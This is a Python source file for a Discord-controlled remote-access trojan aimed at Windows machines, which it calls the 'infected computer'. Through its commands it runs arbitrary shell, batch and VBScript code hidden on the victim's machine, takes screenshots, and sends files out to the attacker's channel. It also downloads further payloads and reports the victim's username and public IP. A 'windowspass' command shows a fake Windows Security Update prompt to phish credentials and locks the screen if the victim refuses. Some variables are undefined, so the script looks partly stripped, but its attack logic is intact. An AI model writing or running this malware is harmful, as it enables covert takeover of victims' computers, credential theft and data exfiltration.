import os
import discord 
from discord.ext import commands
import subprocess
import requests
import pyautogui


#######################



@bot.event
async def on_ready():
    print(f'{bot.user} ON!')
# Comandos:

@bot.command()
async def ayuda(message):

    embed=discord.Embed(
            title="commands and help", 
            description=cmds,
            color=0xFF5733,
            ).set_footer(text='')
    await message.reply(embed=embed)

@bot.command()
async def whoami(message):
    ip = requests.get('https://api.ipify.org').text
    def whoami():
        output = subprocess.run('whoami', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return output 
    whoami2 = str(whoami().stdout.decode('CP437'))
    await message.reply(f'**The file was executed on the computer:** {whoami2} (PUBLIC IP: {ip})')
    
@bot.command()
async def cmd(message, *, args=None):
        if args == None: 
            return await message.reply(f'**You must place a command to run in the user console.**\n Example: `{prefix}cmd <JUSTIFICATION [Command]>`')
        command =  args
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output 
            
        result = str(shell().stdout.decode('CP437'))
        numb = len(result)
        if numb < 1: return await message.reply('**Command executed successfully but... No command found or nothing output from the console.**')
        if len(result) > 2000:
            file = open('2000.txt', 'a')
            file.write(result)
            file.close()
            os.system('attrib +h "2000.txt"')
            filebuffer = discord.File("2000.txt", filename="2000.txt")
            await message.reply(f'**Insert command successfully!**\n **Output:**', file=filebuffer)
            os.remove('2000.txt')
        else:
            await message.reply(f'**Insert command successfully!**\n ```\nComando Output: {result}```')

@bot.command()
async def cd(message, *, args=None):
    if args == None: return message.reply(f'**Place the route you want to move to.**\n ```\n ')
    try:
        os.chdir(args)
        output = subprocess.run('dir', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = str(output.stdout.decode('CP437'))
        if len(result) > 2000:
            file = open('2000.txt','a')
            file.write(result)
            file.close()
            filebuffer = discord.File('2000.txt',filename='2000.txt')
            await message.reply('**Command started successfully:**\n**Output:**\n', file=filebuffer)
        else:
            await message.reply(f'**Command started successfully:**\n ```\n Console Output:\n {result}```')
    except os.error as err:
        await message.reply(f'**An error occurred while trying to access the route:**\n```\nConsole Log:\n{err}```')


@bot.command()
async def windowspass(message, *,args=None):

    import subprocess
    

    
    log = "$cred=$host.ui.promptforcredential('Windows Security Update','Windows has received a security update. Please enter your username and password to continue using your device.',[Environment]::UserName,[Environment]::UserDomainName);"
    username = 'echo **Username:** $cred.getnetworkcredential().username;'
    password = 'echo **Password:** $cred.getnetworkcredential().password;'
    command = 'Powershell "{} {} {}"'.format(log,username,password)


    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    result = str(output.stdout.decode('CP437'))
    if not result:
        os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""You must enter the credentials.""",0,"""Windows Security Update: ERROR""",0x30)')
        output2 = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result2 = str(output2.stdout.decode('CP437'))
        if not result2:
            os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""You have canceled this security measure, so you should be aware that you could be exposed to critical system vulnerabilities.""",0,"""This action has been canceled.""",0x10)')

            os.system('rundll32.exe user32.dll, LockWorkStation')
            await message.reply(f"**The exploit was injected to get the password correctly, but the victim did not write anything.**")
        await message.reply(f"**The exploit was injected to get the password correctly!**\nResultado:\n---------------------------------------------\n{result2}")
    else:
        await message.reply(f"**The exploit was injected to get the password correctly!**\nResultado:\n---------------------------------------------\n{result}")

@bot.command()
async def screenshot(message):

        try:
            captura = pyautogui.screenshot()
            captura.save('ss.png')
            os.system('attrib +h "ss.png"')
            ss = discord.File('ss.png', filename='ss.png')
            await message.reply(f'**Screenshot taken correctly:**', file=ss)
            os.remove('ss.png')
        except os.error as err:
            await message.reply('**An error occurred, try again.**')
    



@bot.command()   
async def batinjector(message, *,args=None):

    
    if args == None: 
        return await message.reply(f'**insert Batch Code on the user PC.**\n Example:\n```\n{prefix}batinjector <JUSTIFICATION [Batch Code]>\n Example de uso:\n\n{prefix}batinjector @echo off\nstart https://youtube.com```')
    else:
        code =  args
        
        file = open('i.bat','a')
        file.write(code)
        file.close()
        os.system('attrib +h "i.bat"')

        def shell():
            output = subprocess.run('i.bat', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            return output
        coutput = str(shell().stdout.decode('CP437'))

        if len(coutput) > 2000:
            file2 = open('2000.txt','a')
            file2.write(coutput)
            file.close()
            os.system('attrib +h "2000.txt"')
            filebuffer = discord.File('2000.txt', filename='2000.txt')
            await message.reply(f'**inserted correctly.**\n **Console Output:**', file=filebuffer)
            os.remove('2000.txt')
            os.remove('i.bat')
        else:
            await message.reply(f'**inserted correctly.**\n ```\nConsole Output:\n {coutput}```')
            os.remove('i.bat')

@bot.command()   
async def vbsinjector(message, *,args=None):


    
    if args == None: 
        return await message.reply(f'**You must enter Batch Code on the users PC.**\n example:\n```\n{prefix}vbsinjector <JUSTIFICATION [VBScript Code]>\n usage example:\n\n{prefix}vbsinjector\nx=msgbox("You got hacked lol" ,0, "You are Hacked")```')
    else:
        code =  args
        
        file = open('i.vbs','a')
        file.write(code)
        file.close()
        os.system('attrib +h "i.vbs"')

        def shell():
            output = subprocess.run('i.vbs', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        coutput = str(shell().stdout.decode('CP437'))

        if len(coutput) > 2000:
            file2 = open('2000.txt','a')
            file2.write(coutput)
            file.close()
            os.system('attrib +h "2000.txt"')
            filebuffer = discord.File('2000.txt', filename='2000.txt')
            await message.reply(f'**VBScript injected correctly.**\n **Console Output:**', file=filebuffer)
            os.remove('2000.txt')
            os.remove('i.vbs')
        else:
            await message.reply(f'**VBScript injected correctly.**\n ```\nConsole Output:\n {coutput}```')
            os.remove('i.vbs')
@bot.command()
async def ufile(message, *, args=None):
    if args == None: 
        return await message.reply(f'**You must put the name of the file you want to obtain.**\n (This must not weigh more than 8mb (DISCORD LIMIT FOR SERVERS v1))\n You can use the command: `{prefix}cd /ROUTE` to move in the user files.')
    else:
        filebuffer = discord.File(f'./{args}', filename=args)
        await message.reply('**Command injected successfully, here is the file:**', file=filebuffer)
@bot.command()
async def dfile(message, args1=None, args2=None):
    if args1 == None:
        return await message.reply(f'**You must put the URL of the file that you want the infected computer to download.**\nExample: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`\n (Nota: As a recommendation use the command: `{prefix}cd /ROUTE` to move between the user files to one more hidden so that when downloading the file it is not visible to the user.)')
    if args2 == None:
        return await message.reply(f'**You must put the path and the name with the extension of the file to save it.**\n Example: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`')
    if not args1.startswith('http'): return message.reply(f'**You must put the URL of the file that you want the infected computer to download.**\nExample: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`\n (Nota: As a recommendation use the command: `{prefix}cd /ROUTE` to move between the user files to one more hidden so that when downloading the file it is not visible to the user.)')
    os.system(f'Powershell Invoke-WebRequest {args1} -OutFile {args2}')
    await message.reply('**The file was downloaded successfully.**')



bot.run(token) # Bot Login   
 
